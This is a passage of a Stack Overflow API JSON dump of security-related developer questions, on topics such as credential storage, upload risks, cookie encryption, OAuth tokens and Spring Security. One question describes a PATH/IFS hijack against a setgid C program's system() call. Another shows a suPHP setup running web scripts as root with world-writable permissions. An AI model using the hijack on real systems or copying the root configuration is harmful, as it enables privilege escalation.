when using 'local system'</p>\n"},{"tags":["php","database","security"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":242,"score":2,"question_id":8744568,"title":"PHP: Securing database connection credentials","body":"<p>I'm working towards an environment where multiple websites will use the same exact copy of PHP though with their own instances of MySQL databases. This obviously implies connection credentials for each website, the more users the more passwords and therefore the more desirable a target for hackers. Just to make sure everyone is on the same page these are the credentials I'm talking about...</p>\n\n<pre><code>$user = 'user';// not actual user, not root either\n$pass = 'pass';// not actual password\n$server = 'localhost';\n$database = mysql_connect($server,$user,$pass,true|false);\n</code></pre>\n\n<p>So I'm talking about the passwords used to <em>connect</em> to the database, not the passwords in the database (which for clarification I have hashed with salt and pepper).</p>\n\n<p>I have not read anything that I think remotely suggests you can have 100% foolproof security since obviously the server needs to connect to the database and get the content for visitors 24/7; if I am mistaken I would love to hear how this would be possible.</p>\n\n<p>So let's presume a hacker has root access (or if that does not imply access to the PHP code let's just say then have access to all the PHP source code) and they (in this circumstance) desire to access/modify/etc databases. If we can not prevent them should they have access to the PHP source then we want to slow them down as much as possible. I can keep each site/database connection password in separate files (can as in I'm a few weeks from finishing multi-domain support) for each site and not inside of public_html (obviously). I use serialize and unserialize to store certain variables to ensure certain level of fault tolerance for when the database becomes unavailable on shared hosting (preventing site A from looking and acting like site B and vice-versa) as the database can sometimes become unavailable numerous times a day (my database error logs are written to when the SQL service becomes available again and catches these \"away\" errors). One thought that has crossed my mind is determining a way to store the passwords in one hash and un-hashing them to be used to connect to the database by PHP though I'd like some opinions about this as well please.</p>\n\n<p>If someone has a suggestion from the database perspective (e.g. having the ability to restrict users to SELECT, INSERT, DELETE, UPDATE, etc and not allowing DROP and TRUNCATE as examples) my primary concern is making sure I am SQL neutral as I plan to eventually migrate from MySQL to PostgreSQL (this may or may not be relevant though if it is better to mention it). I currently use phpMyAdmin and cPanel and phpMyAdmin shows the connected user is not the same as the site's database user names so in that regard I can still use certain commands (DROP and TRUNCATE as examples again) with that user and restrict the SITE user permissions unless I am mistaken for some reason?</p>\n\n<p>Is there a way to configure the context of where the connection credentials are accepted? For clarification a hacker with access to the source code would not be accessing the site the same way legitimate users would.</p>\n\n<p>Another idea that crossed my mind is system based encryption, is there a near-universal (as in on every or almost every LAMP web host setup) web-hosting technique where the system can read/write the file through Apache that would introduce a new layer that a hacker would have to determine a way to circumvent?</p>\n\n<p>I am using different passwords for each user of course.</p>\n\n<p>I currently am on shared hosting though hopefully my setup will scale upwards to dedicated hosting eventually.</p>\n\n<p>So what are the thoughts on my security concepts and what other concepts could I try out to make my database connection credentials more secure?</p>\n\n<p>Clarification: I am looking for ideas that I can pursue. If there is disagreement with any of the suggestions please ask for clarification and explain your concern in place of debating a given approach as I may or may not have even considered let alone begun to pursue a given concept. Thanks!</p>\n"},{"tags":["vb.net","security","active-directory"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12897494,"title":"How to validate the active directory domain my app ist running in?","body":"<p>I have a VB.Net Application that authenticates using the current Windows User without asking for the password. It checks that this user is a member of \"MYDOMAIN\\ApplicationUsers\" before it starts up.</p>\n\n<p>How to check if this is the real domain and not a different one using the same name? Are there any certs or public keys to validate locally? I'd prefer to check this offline, without a third party machine or database etc.</p>\n\n<p>In the System.DirectoryServices.ActiveDirectory Namespace are some Trust an Validate methods but they only seem to check inter domain trust and using a domain name only.</p>\n"},{"tags":["c#","asp.net","security","file-upload"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":146,"score":3,"question_id":12864441,"title":"File upload security Concern","body":"<p>I am having a web form available to public, which has file upload capability. Now files are either saved on web server or sent out as attachment in an email.  We are having restriction on size i.e 15MB and extensions of file being uploaded. Our SMTP server is on same web server. I have concern about security, as anyone can upload malicious files and can have impact on our production web server. </p>\n\n<p>What are the risks I will be having by such file upload control available to public? Is there anyway someone can execute malicious script on web server by uploading malicious file.</p>\n\n<p>I did some research and found out following points</p>\n\n<ol>\n<li>If I sent out a file as an attachment in an email, this file will be stored for temporary period in Temporary ASP .Net folders, and once email is sent this will get deleted.</li>\n<li>You can rename a file before saving them on file system.</li>\n<li>You can save file on different location as your website</li>\n<li>You can have some sort of real time virus check. I am not sure how you can do that. I was reading about some command line virus scan. But not sure if I really need that.</li>\n</ol>\n\n<p>These are just few points, but I would like to know about any blind spots in file upload.</p>\n"},{"tags":["security","symfony2","acl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12897423,"title":"Check if Symfony 2 role has a permission set","body":"<p>how can I check if a Symfony 2 role has a XXX permission on a object? I inserted a class ace and I can correctly see that the user I'm logged in that has that role has also the requested permission but I would print for each role the list of permissions it has. Thank you</p>\n"},{"tags":["javascript","security","phonegap","jquery-mobile","cordova"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12865943,"title":"securely store user password locally in a jquery mobile app","body":"<p>I need to access an api which requires http authentification on a per user basis using a jquery mobile api.</p>\n\n<p>I plan to make the app available as a website as well as packaging it in Cordova for various devices.</p>\n\n<p>If I have a login form which captures the username and password and store this as a javascript variable, is there any way this data could be exposed?</p>\n\n<p>If so, what's the best alternative to handle storing the users authentification details? I am reticent to build an intermediary server if I don't have to.</p>\n\n<p>Many Thanks. :D</p>\n"},{"tags":["ruby-on-rails","security"],"answer_count":1,"favorite_count":5,"up_vote_count":13,"down_vote_count":0,"view_count":2466,"score":13,"question_id":4147387,"title":"How to secure a Rails app against Firesheep?","body":"<p>I have not been able to find an easy guide for securing a Ruby on Rails app against a <a href=\"http://codebutler.com/firesheep\" rel=\"nofollow\">Firesheep</a>.</p>\n\n<p>In case you don't know, Firesheep jacks session cookies if your app doesn't force SSL and set the secure flag in the cookie. I had to do some searching to find these two things, so I thought I'd post what I found here and see if there is anything else I'm missing.</p>\n\n<p><strong>Step 1</strong> Force SSL</p>\n\n<p>There are two ways to do this that I found. One is using the <a href=\"https://github.com/rails/ssl_requirement\" rel=\"nofollow\">ssl_requirement</a> plugin, but this is a pain because you have to specifically specify <code>ssl_required :action1, :action2</code> in every controller.</p>\n\n<p>The preferable way appears to be by using Rack Middleware, via this post: <a href=\"http://stackoverflow.com/questions/3861772/force-ssl-using-ssl-requirement-in-rails-app/3862679#3862679\">Force SSL using ssl_requirement in Rails app</a>. Works like a charm.</p>\n\n<p><strong>Step 2</strong> Make cookies secure</p>\n\n<p>For this I followed <a href=\"http://www.kalzumeus.com/2010/10/25/how-to-use-ssl-to-secure-your-rails-app-against-firesheep-and-other-evils/\" rel=\"nofollow\">these directions</a>, which tell you to put the following in your <code>config/environment/production.rb</code> file:</p>\n\n<pre><code>config.action_controller.session = {\n    :key     =&gt; 'name_of_session_goes_here',\n    :secret          =&gt; 'you need to fill in a fairly long secret here and obviously do not copy paste this one',\n    :expire_after    =&gt; 14 * 24 * 3600, #I keep folks logged in for two weeks\n    :secure =&gt; true #The session will now not be sent or received on HTTP requests.\n  }\n</code></pre>\n\n<p>This was all pretty straight-forward on my Rails 2.x app. Did I miss anything? Is it different for Rails 3?</p>\n"},{"tags":["php","security","nginx","fwrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12878304,"title":"Dynamically write nginx configurations from PHP","body":"<p>I am looking to write custom <code>nginx</code> directives dynamically from <code>PHP</code>. I am however concerned with security. PHP runs under the user/group <code>php:php</code> and the nginx configuration file is owned by <code>root:root</code>.</p>\n\n<p>For PHP to be able to open and write to the nginx configuration file, the file needs to be owned by the user and group <code>php:php</code>.</p>\n\n<p>What is the best way to do this? I suppose, I could have a secondary process in another language or PHP that actually does the read and write of the configuration files, and PHP simply talks to the secondary process.</p>\n"},{"tags":["ruby-on-rails","security","cookies","encryption"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":674,"score":1,"question_id":9364962,"title":"Storing an encrypted cookie with Rails","body":"<p>I need to store a small piece of data (less than 10 characters) in a cookie in Rails and I need it to be secure. I don't want anybody being able to read that piece of data or injecting their own piece of data (as that would open up the app to many kinds of attacks). I think encrypting the contents of the cookie is the way to go (should I also sign it?). What is the best way to do it?</p>\n\n<p>Right now I'm doing this, which looks secure, but many things looked secure to people that knew much more than I about security and then it was discovered it wasn't really secure.</p>\n\n<p>I'm saving the secret in this way:</p>\n\n<pre><code>encryptor = ActiveSupport::MessageEncryptor.new(Example::Application.config.secret_token)\ncookies[:secret] = {\n  :value =&gt; encryptor.encrypt(secret),\n  :domain =&gt; \"example.com\",\n  :secure =&gt; !(Rails.env.test? || Rails.env.development?)\n}\n</code></pre>\n\n<p>and then I'm reading it like this:</p>\n\n<pre><code>encryptor = ActiveSupport::MessageEncryptor.new(Example::Application.config.secret_token)\nsecret = encryptor.decrypt(cookies[:secret])\n</code></pre>\n\n<p>Is that secure? Any better ways of doing it?</p>\n\n<p><strong>Update</strong>: I know about Rails' session and how it is secure, both by signing the cookie and by optionally storing the contents of the session server side and I do use the session for what it is for. But my question here is about storing a cookie, a piece of information I do not want in the session but I still need it to be secure.</p>\n"},{"tags":["ios","security","amazon-s3"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12891492,"title":"Safe way to store secretAccessKey on iOS application","body":"<p>I am using amazon S3 to provide IAP content.</p>\n\n<p>Is there a \"Safe\" way to store the secretAccessKey inside my app so hackers can't use it to get the files?</p>\n"},{"tags":["security","asp.net-membership","web-security","webmatrix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12895070,"title":"WebSecurity and long IDs","body":"<p>I'm looking to use the long datatype (bigint) for various id values in a system and the current implementation for the WebSecurity class makes the assumption that the UserId is an int (smallint).</p>\n\n<p>I'm considering downloading the source and editing it to use long data types instead.  Does anyone know if this has already been done?</p>\n\n<p>TIA,</p>\n"},{"tags":["security","cross-browser","bookmarklet","bookmarks"],"answer_count":1,"favorite_count":5,"up_vote_count":6,"down_vote_count":0,"view_count":349,"score":6,"question_id":5464489,"title":"Bookmarklet approach","body":"<p>I am trying to write a bookmarklet that will bookmark the current page and save the link to the current page in a backend service. When I click this bookmarklet, I want this bookmarklet to show up as a small popup on the top right in browser tab (attach iframe to existing page). This popup will have options to bookmark current page. Also, there will be options search my bookmarks, tag, etc in this popup. </p>\n\n<p>So far, I have not seen any such bookmarklets (from delicioius, pinboard,etc). Although there are bookmarklets to  post links to various services,  they don't let you search, see the existing list of bookmarks within in the same popup. User is forced to go to the bookmarking site in a new tab to search, etc. </p>\n\n<p>I am wondering is there a reason why bookmarklets (popup within existing page) like this are not done? Are there any security reasons for this? Or will be be blocked by adblockers?</p>\n"},{"tags":["security","spring","session","filter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":728,"score":0,"question_id":9118793,"title":"spring security custom sessionmanagementfilter same order value error","body":"<p>I'm trying to customize the session management filter of Spring Security, but I get the error saying that my filter and the default one have the same 'order' value (although I don't have any <code>&lt;session-managent&gt;</code> in my <code>&lt;http&gt;</code> configuration and I have autoconfig=false, as Spring Security says in its documentation).</p>\n\n<p>Here's my configuration of Spring Security:</p>\n\n<pre><code>&lt;http auto-config=\"false\" use-expressions=\"true\"&gt;\n\n    &lt;custom-filter position=\"SESSION_MANAGEMENT_FILTER\" ref=\"filtroGestionSesion\" /&gt;\n\n    &lt;intercept-url pattern=\"/resources/**\" filters=\"none\"/&gt;\n    &lt;intercept-url pattern=\"/faces/javax.faces.resource/**\" filters=\"none\"/&gt;\n    &lt;intercept-url pattern=\"/faces/inicio.xhtml\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/autenticacion/login.xhtml*\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/administracion/**\" access=\"isAuthenticated()\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/barco/**\" access=\"isAuthenticated()\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/catalogo/**\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/error/**\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/plantillas/**\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/**\" access=\"denyAll\" /&gt;\n\n    &lt;form-login login-processing-url=\"/j_spring_security_check\"\n                login-page=\"/faces/paginas/autenticacion/login.xhtml\"\n                default-target-url=\"/faces/paginas/administracion/inicioAdmon.xhtml\"\n                always-use-default-target=\"true\"\n                authentication-failure-url=\"/faces/paginas/autenticacion/login.xhtml?error=authentication\" /&gt;\n\n    &lt;logout logout-url=\"/j_spring_security_logout\"\n            logout-success-url=\"/faces/inicio.xhtml\"\n            invalidate-session=\"true\" /&gt;\n&lt;/http&gt;\n\n&lt;global-method-security pre-post-annotations=\"enabled\" /&gt;\n\n&lt;authentication-manager&gt;\n    &lt;authentication-provider&gt;\n      &lt;user-service&gt;\n        &lt;user name=\"myuser\" password=\"myuser\" authorities=\"\" /&gt;\n      &lt;/user-service&gt;\n    &lt;/authentication-provider&gt;\n&lt;/authentication-manager&gt;\n\n&lt;beans:bean id=\"filtroGestionSesion\" class=\"springSecurity.FiltroGestionSesion\"&gt;\n    &lt;beans:constructor-arg ref=\"securityContextRepository\" /&gt;\n    &lt;beans:property name=\"invalidSessionUrl\" value=\"/faces/paginas/autenticacion/login.xhtml?error=timeout\" /&gt;\n&lt;/beans:bean&gt;\n\n&lt;beans:bean id=\"securityContextRepository\" class=\"org.springframework.security.web.context.HttpSessionSecurityContextRepository\" /&gt;\n</code></pre>\n\n<p>The class with my custom filter (springSecurity.FiltroGestionSesion) is a copy-paste from the one from Spring Security (org.springframework.security.web.session.SessionManagementFilter) but changing the package name, the class name and some custom code I added to the doFilter method.</p>\n\n<p>Why doesn't it work and throws the error saying both filters have the same order?</p>\n\n<p>I already disabled the default filter by removing the corresponding child element <code>&lt;session-mangement&gt;</code> from <code>&lt;http&gt;</code>, so that the position of my filter doesn't conflict with the default filter.</p>\n\n<p>Do I have to remove any element else or customize anything else?</p>\n\n<p>Any one knows how to do a custom filter works in the position of SESSION_MANAGEMENT_FILTER disabling the default one?</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["spring","apache","security","spring-security","shiro"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":883,"score":1,"question_id":11500646,"title":"Spring security vs Apache Shiro","body":"<p>What I have researhed so far most of them are saying Apache Shiro is easy to use and easy to integrate with CAS (for SSO etc). Just to ask if anyone has got experienced using both of them and which one to use and why one is better than other?</p>\n"},{"tags":["android","security","aes"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12893126,"title":"converting the file type to be able , use by AES algorithm","body":"<p>how to make a file(image,text,audio,video,etc) ready to use by AES algorithm for encryption? do i need to change a format of the file to be ready use by AES,and if it is how can i do that.\nthanks in advance</p>\n"},{"tags":["security","nhibernate","orm","data-access"],"answer_count":7,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":2364,"score":9,"question_id":117129,"title":"What are best practices to implement security when using NHibernate?","body":"<p>Traditionalist argue that stored procedures provide better security than if you use a Object Relational Mapping (ORM) framework such as NHibernate. </p>\n\n<p>To counter that argument what are some approaches that can be used with NHibernate to ensure that proper security is in place (for example, preventing sql injection, etc.)?</p>\n\n<p>(<em>Please provide only one approach per answer</em>)</p>\n"},{"tags":["security","list","sharepoint","sharepoint2010"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12889564,"title":"Safely return all lists in site collection that match criteria","body":"<p>I'm using the following code to get all \"Announcement\" lists in a Web Applications site collection.</p>\n\n<p>Unfortunately, sometimes the current user does not have permission to that site and the page fails with an exception, even inside the try block.</p>\n\n<p>What would be the right way to do the following safely for all users, where even an anonymous user would just get no results?</p>\n\n<pre><code>static public List&lt;SPListMeta&gt; AllSiteAnnouncementsLists()\n{\n    var returnList = new List&lt;SPListMeta&gt;();\n    foreach (SPSite oSiteCollection in SPContext.Current.Web.Site.WebApplication.Sites)\n    {\n        var collWebs = oSiteCollection.AllWebs;\n        try\n        {\n            foreach (SPWeb oWebsite in collWebs)\n            {\n                using (oWebsite)\n                {\n                    var collSiteLists = oWebsite.GetListsOfType(SPBaseType.GenericList);\n                    returnList.AddRange(from SPList oList in collSiteLists where oList.Title == \"Announcements\" select new SPListMeta(oList));\n                }\n            }\n        }\n        catch\n        {\n        }\n\n    }\n    return returnList;\n}\n</code></pre>\n"},{"tags":["android","security","client-server","sso"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12891792,"title":"Secure SSO implementation in a client-server setup","body":"<p>I am creating an Android app and want to use SSO to make it easy for users to sign in to the application using their Google or Facebook account. The app stores its data a server so the user can access it from different devices. On the server, I am planning to use the user's email to identify the user.</p>\n\n<p>On the client I know the email belongs to the user, but how can the server be sure that it's the real user and not an attacker that sends another user's mail address to the server?</p>\n\n<p>Do I have to obtain and send the access token to the server together with the email and have the server verify the email using this token or is there something else I can do?</p>\n\n<p>Since the I'm only interested in the email for logging in it would be convenient to just fetch the mail address once and remember it on the client until the user signs out of my app. However if I need to keep the access token as well I need to regularly check if it's expired and renew it if needed.</p>\n"},{"tags":["objective-c","osx","security","launchd"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12891646,"title":"How to make sure the binary submitted by SMJobSubmit is genuine?","body":"<p>I have an application on Mac which requires elevated privileges to perform certain tasks. To accomplish this, I carry a binary executable inside my App bundle and whenever the elevation is required I submit this executable to launchd using <code>SMJobSubmit()</code>. Along with this executable file, I also submit a plist file with certain arguments to the executable to tell it what all it needs to do. </p>\n\n<p>My concern is that how can I make sure that the executable run is the one that I intend to run. What if someone replaces the executable with a malicious one which if granted the root privileges could play havoc? Does launchd or SMJobSubmit provide any immunity, or do I have to validate signatures and checksums at my end? And curiously, I could not find a single discussion online regarding this problem, maybe I am missing something trivial here.</p>\n\n<p>This <a href=\"http://www.stairways.com/blog/2012-08-06-smjobsubmit\" rel=\"nofollow\">blog</a> gives a nice example of using SMJobSubmit. I have implemented on the same lines.</p>\n"},{"tags":["security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12891367,"title":"Encryption length","body":"<p>Does the encryption length of the hash encrypted influence his own security?</p>\n\n<p>I mean if i use md5() or sha() if the returned hash has 35 chars or 55 chars does will this influence in some way security of hash?</p>\n"},{"tags":["c#",".net","security","firewall"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12889411,"title":"Does the NET Framework communicate with Comodo servers?","body":"<p>I have a 3rd party .NET application that we're using internally, and every few days it communicates with one <code>ocsp.comodoca.com (178.255.83.1)</code>, a server thats run by the COMODO security services.</p>\n\n<p>Does the .NET Framework internally communicate with such servers, for strongly-signed applications or something? I'm just asking because usually we deny such communication and everything works fine. But now we need to allow it for other reasons and I'm wondering exactly what is being tracked. (usage stats?)</p>\n"},{"tags":["json","spring","security","filter","spring-security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12881015,"title":"How to programatically return a json response after executing a custom filter UsernamePasswordAuthenticationFilter?","body":"<p>I'm creating a custom filter UsernamePasswordAuthenticationFilter to handle the authentication process. Basically, when the User performs login http post through the REST /login, the custom filter will execute and should respond a json format containing user details and generated token.</p>\n\n<p>My problem is where do i set to respond a json response to the client?\nI'm thinking of creating a subclass of SavedRequestAwareAuthenticationSuccessHandler and set there the json response. Is this a good idea?</p>\n\n<p>Any help will be much appreciated =)</p>\n\n<p>Thanks</p>\n"},{"tags":["android","security","voip"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12873116,"title":"How to make my own secure VOIP application on Android?","body":"<p>I want to implement my own encryption rule before the call data go into GSM network i.e. I want the call stream in the form of bits, I will implement my own encryption algo, and then send on to the network, my app on the other side(reciever's end) will recieve the data, decrypt it and make it into audio.\nI want to know is it feasible, if it is how? I mean I want to use cell phone network as in like Airtel, Vodafone etc.</p>\n\n<p>If it is not possible It will be of great help, if I can do it using internet (2G or 3G) ?</p>\n\n<p>Any guidance in this, I want just direction.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","mysql","sql","security","pdo"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":12887696,"title":"safely escaping table names/column names","body":"<p>I'm using PDO in php and as such can't escape table names or column names using prepared statements. Would the following be a foolproof way to implement it myself:</p>\n\n<pre><code>$tn = str_replace('`', '', $_REQUEST['tn']);\n$column = str_replace('`', '', $_REQUEST['column']);\n$sql = \"SELECT * FROM `tn ` WHERE `column` = 23\";\nprint_r(\n    $pdo-&gt;query($sql)-&gt;fetchAll()\n);\n</code></pre>\n\n<p>Or is there still some avenue that this can be attacked?</p>\n"},{"tags":["php","security","encryption","phpmailer","smime"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12887584,"title":"S/MIME empty email's","body":"<p>As followup on <a href=\"http://stackoverflow.com/questions/12886568/phpmailer-and-s-mime\">my previous question</a>. I've implemented the changes as posted <a href=\"http://www.adam-makes-websites.com/discoveries/sending_secure_certified_s-mime_emails_via_php\" rel=\"nofollow\">here</a>.</p>\n\n<p>The email's send correctly, the subject works, but there is no body in the email.</p>\n\n<p>If i remove the $mail->sign_cert_file variables, the email sends correctly.</p>\n\n<p>What could be the issue?</p>\n"},{"tags":["spring","security","jsf"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12887097,"title":"Session scoped beans are viewed in other users session","body":"<p>I am using spring 3.1 , spring security 3.1 , primefaces with jsf 2.0 .</p>\n\n<p>I have created a login page with just simple <code>username</code> and <code>password</code>, this page is linked to a session scoped bean which has a username and password.</p>\n\n<p>When say for example <code>user x</code> access the website and still not logged out, when someone else in another place view the login page, the username value which <code>user x</code> has written appears automatically in the username field.</p>\n\n<p>How can I overcome that problem?</p>\n"},{"tags":["php","security","phpmailer","digital-certificate","smime"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12886568,"title":"PHPMailer and S/MIME","body":"<p>For a school assignment we have to send secure emails coming from a bank (we are the bank). In order to secure these emails im using PHPMailer. \nPHPMailer contains a Sign($cert_filename, $key_filename, $key_pass) method that signs the email using a certificate. I'm guessing that this is making the email 'secure' and that the customer can really know it is the bank sending the email. I'm sending the emails over my own domain using SMTP.</p>\n\n<p>In order to get the certificate i've created a certificate at <a href=\"http://www.instantssl.com/ssl-certificate-products/free-email-certificate.html\" rel=\"nofollow\">this website</a>, that got installed in my browser. </p>\n\n<p>Now the question is: how do I use that certificate to sign the emails i'm sending using my PHP script and PHPMailer? I've exported the certificate from my browser (FF), which results in a .p12 file, but i think the .p12 file isn't what im looking for.</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["security","oauth"],"answer_count":4,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":3494,"score":11,"question_id":3487991,"title":"Why Does OAuth v2 Have Both Access and Refresh Tokens?","body":"<p>Section 4.2 of the draft OAuth 2.0 protocol indicates that an authorization server can return both an access_token (which is used to authenticate one's self with a resource) as well as a refresh_token, which is used purely to create a new access_token:</p>\n\n<p><a href=\"http://tools.ietf.org/html/draft-ietf-oauth-v2-10#section-4.2\">http://tools.ietf.org/html/draft-ietf-oauth-v2-10#section-4.2</a></p>\n\n<p>Why have both? Why not just make the access_token last as long as the refresh_token and not have a refresh_token?</p>\n"},{"tags":["c","security","ifs"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12873964,"title":"C: IFS System() Vulnerability","body":"<p>For educational reasons I have to exploit an C-Code</p>\n\n<p>The Programm set the egid first, and then the vulnerability with the <code>system(\"/usr/bin/...\");</code> Command. </p>\n\n<p>So I made an 'usr' executeable in my Home-Directory and set the Path to the Home <code>PATH=$HOME:$PATH</code></p>\n\n<p>And I want to change the IFS Variable in the bash to /: <code>export IFS='/'</code></p>\n\n<p>Unfortunatelly, when i call the C-Programm: my exploit doesn't work</p>\n\n<p>Is anybody able to tell me what is wrong?</p>\n"},{"tags":["c#",".net","windows","security"],"answer_count":5,"favorite_count":6,"up_vote_count":19,"down_vote_count":0,"view_count":10392,"score":19,"question_id":1089046,"title":"In .NET/C# test if user is an administrative user","body":"<p>Is there a canonical way to test to see if a user has administrative privileges on a machine?  </p>\n\n<p>I'm going to be starting a long running process, and much later in the process' lifetime it's going to attempt some things that require admin privileges.</p>\n\n<p>I'd like to be able to test up front if the user has those rights rather than later on.</p>\n"},{"tags":["security","passwords","standards","password-protection"],"answer_count":0,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":58,"score":5,"question_id":12732356,"title":"What standards are there for mangaging high value passwords?","body":"<p>I am leading a small team at a start-up and I am facing a dilemma with high value passwords. </p>\n\n<p>I am the only one on the team who knows all the key passwords for production servers, databases ... etc. If I get run over by a bus the rest of the team has no way of getting back into all these essential services. </p>\n\n<p>What standards exist for processes around deciding who should have access to high value passwords and how is it communicated and stored? How have you dealt with this issue on previous teams / startups. </p>\n\n<p>The application we are working on stores financial data, thus my interest in \"standards\". </p>\n\n<p><em>Update</em>: To answer some of the questions in the comments: </p>\n\n<ul>\n<li>All Servers are RedHat Enterprise Linux </li>\n<li>App Server is tomcat </li>\n<li>Database is postgres</li>\n<li>Datacenter is SSA16 certified</li>\n<li>Dedicated Servers</li>\n<li>Every server has three seperate physcial networks it is part of, production traffic in one one nic, backups on another nic, and server management on another nic.</li>\n<li>High value passwords to secure Linux Server Passwords, SSL certificates, passwords for JKS files,  passwords for development infrastructure and deployment infrastructure such as sendgrid,stripe,jira,source control, ... etc. </li>\n</ul>\n\n<p><strong>UPDATE</strong>: So far the answers are all suggesting ways of solving the problem, but are there are any standards backed by some standards body about how to do this? I will keep this question open in hopes of some one being able to name specific standards.</p>\n"},{"tags":["security","sso","iam"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":11840519,"title":"Opensource IAM tool used in development","body":"<p>I am looking for an Opensource lightweight IAM to be used in development as a substitute for the real commercial IAM in production. Something with basic IAM functionalities, easy to install &amp; easily configured to inject HTTP headers like user group.\nIs OpenAM a good option? Any recommendations?</p>\n"},{"tags":["c","security","macros"],"answer_count":5,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":112,"score":5,"question_id":12882301,"title":"How is the __func__ identifier a security risk?","body":"<p>I saw in a comment that using <code>__func__</code> is a security risk. I need to understand how is that the case?</p>\n"}]}
{"total":17772,"page":8,"pagesize":100,"questions":[{"tags":["php","security","root","suphp"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1011,"score":0,"question_id":5655660,"title":"suPHP execute PHP script as root","body":"<p>I have created several websites. Now I need to perform <code>root</code> tasks. I created a webplatform and installed. <code>root</code> owns all scripts in <code>/var/private-www/</code> and they are chmodded (0777). In <code>/var/private-www/test.php</code> stands: <code>&lt;?php echo exec('whoami'); ?&gt;</code>. My <code>suPHP</code> config is this:</p>\n\n<pre><code> [global]\n;Path to logfile\nlogfile=/var/log/suphp/suphp.log\n\n;Loglevel\nloglevel=info\n\n;User Apache is running as\nwebserver_user=root\n\n;Path all scripts have to be in\ndocroot=/var/private-www\n\n;Path to chroot() to before executing script\n;chroot=/mychroot\n\n; Security options\nallow_file_group_writeable=false\nallow_file_others_writeable=false\nallow_directory_group_writeable=false\nallow_directory_others_writeable=false\n\n;Check wheter script is within DOCUMENT_ROOT\ncheck_vhost_docroot=true\n\n;Send minor error messages to browser\nerrors_to_browser=false\n\n;PATH environment variable\nenv_path=/bin:/usr/bin\n\n;Umask to set, specify in octal notation\numask=0077\n\n; Minimum UID\nmin_uid=0\n\n; Minimum GID\nmin_gid=0\n\n\n[handlers]\n;Handler for php-scripts\napplication/x-httpd-suphp=\"php:/usr/bin/php-cgi\"\n\n;Handler for CGI-scripts\nx-suphp-cgi=\"execute:!self\"\n</code></pre>\n\n<p>When I execute <code>test.php</code> in my webbrowser, it says: <code>www-data</code> :(. Not <code>root</code>... Even when I execute it in the command line. Besides, I did <code>a2enmod suphp</code> and <code>apachectl restart</code>, so I was thinking it would work. How can I fix this?</p>\n"},{"tags":["php","security","symfony2"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":140,"score":2,"question_id":12881374,"title":"Authentication does not work","body":"<p>I have set a secured area using http_basic . I can see the box with username and password fields but even if I put correct information I get the box again and again as if I used wrong ones.\nMy security.yml:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>security:\n    firewalls:\n        secured_area:\n            pattern:    ^/\n            anonymous: ~\n            http_basic:\n                realm: \"Secured Demo Area\"\n\naccess_control:\n    - { path: ^/fournisseur, roles: ROLE_ADMIN, requires_channel: https }\n\nproviders:\n    in_memory:\n        memory:\n            users:\n                ryan:  { password: ryanpass, roles: 'ROLE_USER' }\n                admin: { password: kitten, roles: 'ROLE_ADMIN' }\n</code></pre>\n\n<p>PS: I am using an SSL certificate overall my web 